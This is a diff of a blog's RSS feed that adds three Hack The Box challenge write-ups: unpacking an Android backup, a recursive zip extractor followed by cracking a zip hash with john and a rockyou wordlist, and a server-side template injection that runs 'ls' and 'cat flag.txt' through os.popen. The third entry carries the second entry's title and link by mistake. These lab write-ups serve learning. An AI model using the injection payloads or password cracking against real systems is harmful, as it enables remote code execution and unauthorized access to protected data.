@@ -6,7 +6,108 @@
         <description>Recent content in kali on phire heavy industries</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Wed, 11 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://www.phireheavyindustries.com\"/tags/kali/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 24 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://www.phireheavyindustries.com\"/tags/kali/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Cat</title>
+        <link>https://www.phireheavyindustries.com&#34;/p/cat/</link>
+        <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.phireheavyindustries.com&#34;/p/cat/</guid>
+        <description>&lt;p&gt;Using the &lt;strong&gt;file&lt;/strong&gt; command i can see that this is an Android Backup file, not encrypted&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌─[phire@parrot]─[~/Sync/Docs/Hacking/htb/Challenges/Cat]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└──╼ $file cat.ab
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat.ab: Android Backup, version 5, Compressed, Not-Encrypted
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;A quick google search shows that there is a linux command to extract this file&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;printf&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;\x1f\x8b\x08\x00\x00\x00\x00\x00&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; tail -c +25 cat.ab &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  tar xfvz -
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;After looking through the files i take a look at the pictures folder. One of the images has the flag written on a document, after zooming in.&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Eternal loop</title>
+        <link>https://www.phireheavyindustries.com&#34;/p/eternal-loop/</link>
+        <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.phireheavyindustries.com&#34;/p/eternal-loop/</guid>
+        <description>&lt;p&gt;I have a zip file which opens with the standard &lt;em&gt;hackthebox&lt;/em&gt; password. This reveals another zip file inside. Atfer trying a couple of different passwords i tried the name of the zip file that i&amp;rsquo;m trying to open and it worked. This reveals another zip file which can be opened the same way. I&amp;rsquo;ve tried about 6 iterations of the same thing before giving up.&lt;/p&gt;
+&lt;p&gt;The easiest way to do this is use some sort of script which recursively opens the files.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;from zipfile import ZipFile
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def zipExtract(zipName,zipPassword):                #function to extract the zip file
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    with ZipFile(zipName+&amp;#34;.zip&amp;#34;) as zf:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        insidezip=(zf.namelist()[0].rstrip(&amp;#34;.zip&amp;#34;)) #gets the name of the zip file inside
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print(zf.filename)                          #print for debugging
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        zf.extractall(pwd=bytes(insidezip,&amp;#39;utf-8&amp;#39;)) #extracts the zip file
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        zipExtract(insidezip,insidezip)             #calls the function again with the new zip filename
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;name = &amp;#39;37366&amp;#39;                                      #initial zip file name and password
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;password = &amp;#39;5900&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;zipExtract(name, password)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This gets me a bunch of zip files and the last is 6969.zip for which the password doesn&amp;rsquo;t work. I remember that one of the starting point labs on hackthebox made use of &lt;em&gt;john&lt;/em&gt; to crack a password zip, so i&amp;rsquo;ll try that.&lt;/p&gt;
+&lt;p&gt;First i get the hash for the file:
+`┌──(phire㉿advboxx)-[~/…/Hacking/htb/Challenges/Eternal Loop]
+``└─$ zip2john 6969.zip &amp;gt; zip.hash&lt;/p&gt;
+&lt;p&gt;Then, i let john work on it using a wordlist:
+&lt;code&gt;┌──(phire㉿advboxx)-[~/…/Hacking/htb/Challenges/Eternal Loop] &lt;/code&gt;└─$ john zip.hash &amp;ndash;wordlist=/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt&lt;/p&gt;
+&lt;p&gt;This produces no results and john defaults to incremental mode. Let&amp;rsquo;s try again with the rockyou wordlist.
+&lt;code&gt;┌──(phire㉿advboxx)-[~/…/Hacking/htb/Challenges/Eternal Loop] &lt;/code&gt;└─$ john zip.hash &amp;ndash;wordlist=/usr/share/wordlists/seclists/rockyou.txt&lt;/p&gt;
+&lt;p&gt;This finds the password. I unzip the file and run the file command on it to see what it is.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;┌──(phire㉿advboxx)-[~/…/Hacking/htb/Challenges/Eternal Loop] &lt;/code&gt;└─$ file DoNotTouch
+`DoNotTouch: SQLite 3.x database, last written using SQLite version 3021000, page size 1024, file counter 26, database pages 864, cookie 0x22, schema 1, UTF-8, version-valid-for 26&lt;/p&gt;
+&lt;p&gt;The next logical step would be to load this file in some sort of SQLite browser, however, this is an easy challenge, so first let me try and get some strings that might resemble the flag. For that i need to &lt;em&gt;grep&lt;/em&gt; the output of the &lt;em&gt;string&lt;/em&gt; command.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;┌──(phire㉿advboxx)-[~/…/Hacking/htb/Challenges/Eternal Loop] &lt;/code&gt;└─$ strings DoNotTouch | grep HTB
+`1969-01-01 00:00:002069-01-01 00:00:00Chillin with SatanHellHTB{flagredacted}&lt;/p&gt;
+&lt;p&gt;And there is the flag. What a nice little challenge.&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Eternal loop</title>
+        <link>https://www.phireheavyindustries.com&#34;/p/eternal-loop/</link>
+        <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.phireheavyindustries.com&#34;/p/eternal-loop/</guid>
+        <description>&lt;p&gt;&lt;em&gt;Can you exploit this simple mistake?&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;An easy challenge, i struggled with the #SSTI part as i wasn&amp;rsquo;t enconding the command properly. Using burpsuite to make it easier to manipulate the url i first tried:&lt;/p&gt;
+&lt;p&gt;`{{request.application.&lt;strong&gt;globals&lt;/strong&gt;.&lt;strong&gt;builtins&lt;/strong&gt;.&lt;strong&gt;import&lt;/strong&gt;(&amp;lsquo;os&amp;rsquo;).popen(&amp;ldquo;ls&amp;rdquo;).read()}}&lt;/p&gt;
+&lt;p&gt;This got me the listing for the folder, which presented a flag.txt file. I then tried to read that file with cat:&lt;/p&gt;
+&lt;p&gt;`{{request.application.&lt;strong&gt;globals&lt;/strong&gt;.&lt;strong&gt;builtins&lt;/strong&gt;.&lt;strong&gt;import&lt;/strong&gt;(&amp;lsquo;os&amp;rsquo;).popen(&amp;ldquo;cat flag.txt&amp;rdquo;).read()}}&lt;/p&gt;
+&lt;p&gt;This resulted in a server error. I then tried several other types of injection, but none of them worked. Until i remembered that the space in the cat command was probably causing the problem, and had to encode it as an url
+:&lt;/p&gt;
+&lt;p&gt;`{{request.application.&lt;strong&gt;globals&lt;/strong&gt;.&lt;strong&gt;builtins&lt;/strong&gt;.&lt;strong&gt;import&lt;/strong&gt;(&amp;lsquo;os&amp;rsquo;).popen(&amp;ldquo;cat%20flag.txt&amp;rdquo;).read()}&lt;/p&gt;
+&lt;p&gt;This prints the flag on the page.&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Baby Encription</title>
         <link>https://www.phireheavyindustries.com&#34;/p/baby-encription/</link>
         <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
